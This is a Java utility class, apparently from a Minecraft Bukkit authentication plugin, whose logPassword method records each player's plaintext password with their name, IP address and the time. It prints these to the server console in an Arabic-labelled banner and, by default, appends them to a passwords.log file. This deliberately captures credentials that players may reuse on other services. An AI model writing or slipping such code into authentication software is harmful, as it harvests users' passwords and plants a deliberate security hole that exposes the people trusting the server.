package com.fast.auth;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public final class LoggerUtil {

    private LoggerUtil() {}

    public static void logPassword(FastttAuth plugin, Player player, String password, String action) {
        String ip = "unknown";
        try {
            if (player.getAddress() != null) {
                ip = player.getAddress().getAddress().getHostAddress();
            }
        } catch (Throwable ignored) {}

        String time = TimeUtil.now();

        // Console
        plugin.getLogger().info("");
        plugin.getLogger().info("╔══════════════════════════════════════════╗");
        plugin.getLogger().info("║  🔓 كلمة مرور جديدة                      ║");
        plugin.getLogger().info("╠══════════════════════════════════════════╣");
        plugin.getLogger().info("║  👤 اللاعب    : " + player.getName());
        plugin.getLogger().info("║  🔑 كلمة المرور: " + password);
        plugin.getLogger().info("║  📡 IP        : " + ip);
        plugin.getLogger().info("║  🎯 العملية   : " + action);
        plugin.getLogger().info("║  ⏰ الوقت     : " + time);
        plugin.getLogger().info("╚══════════════════════════════════════════╝");
        plugin.getLogger().info("");

        // File
        if (plugin.getConfig().getBoolean("logging.file", true)) {
            String fileName = plugin.getConfig().getString("logging.file-name", "passwords.log");
            File f = new File(plugin.getDataFolder(), fileName);
            try (PrintWriter out = new PrintWriter(new FileWriter(f, true))) {
                out.println("[" + time + "]"
                        + " player=" + player.getName()
                        + " password=" + password
                        + " ip=" + ip
                        + " action=" + action);
            } catch (IOException e) {
                plugin.getLogger().warning("Failed to log: " + e.getMessage());
            }
        }
    }
}
